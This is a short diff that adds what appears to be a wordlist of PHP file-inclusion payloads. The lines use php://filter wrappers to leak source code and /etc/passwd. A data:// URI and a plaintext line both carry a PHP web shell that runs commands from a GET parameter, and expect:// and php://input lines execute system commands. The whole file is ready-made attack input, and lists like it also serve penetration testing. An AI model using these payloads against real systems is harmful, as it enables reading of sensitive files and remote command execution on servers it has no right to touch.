@@ -1,0 +1,12 @@
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=index.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+"<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+expect://id
+expect://ls
+php://input||use it seperately
+POST DATA: <? system('id'); ?>//used seperately
